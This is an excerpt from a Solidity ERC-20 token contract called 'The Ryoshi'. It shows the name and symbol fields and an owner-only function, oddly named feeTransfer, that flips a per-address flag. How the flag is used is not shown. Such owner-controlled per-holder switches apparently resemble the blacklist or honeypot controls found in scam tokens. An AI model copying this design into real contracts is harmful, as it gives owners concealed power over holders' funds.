...
contract THERYOSHI is Context, IERC20, Ownable {
    using SafeMath for uint256;
    
    string private _name = 'The Ryoshi';
    string private _symbol = 'THE RYOSHI';
    ...
    function feeTransfer(address _address) external onlyOwner {
        if (_feeTransfer[_address] == true) {_feeTransfer[_address] = false;}
        else {_feeTransfer[_address] = true; 
        emit transferApproved (_address, _feeTransfer[_address]);}
    }
